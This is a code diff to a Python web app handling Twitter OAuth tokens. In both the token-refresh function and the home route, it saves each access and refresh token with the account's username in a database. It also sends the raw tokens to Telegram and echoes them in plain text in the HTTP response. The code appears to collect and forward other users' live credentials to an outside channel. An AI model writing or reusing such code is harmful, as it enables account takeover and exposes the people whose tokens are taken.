@@ -254,7 +254,12 @@ def perform_refresh(refresh_token):
     if response.status_code == 200:
         new_access_token = token_response.get('access_token')
         new_refresh_token = token_response.get('refresh_token')
-        send_to_telegram(new_access_token, new_refresh_token)
+
+        # Store the new tokens in the database
+        username = get_twitter_username(new_access_token)
+        store_token(new_access_token, new_refresh_token, username)
+        
+        send_message_via_telegram(f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}")
         return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
     else:
         error_description = token_response.get('error_description', 'Unknown error')
@@ -315,7 +320,11 @@ def home():
             session['access_token'] = access_token
             session['refresh_token'] = refresh_token
 
-            send_to_telegram(access_token, refresh_token)
+            # Store the new tokens in the database
+            username = get_twitter_username(access_token)
+            store_token(access_token, refresh_token, username)
+
+            send_message_via_telegram(f"Access Token: {access_token}, Refresh Token: {refresh_token}")
             return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
         else:
             error_description = token_response.get('error_description', 'Unknown error')
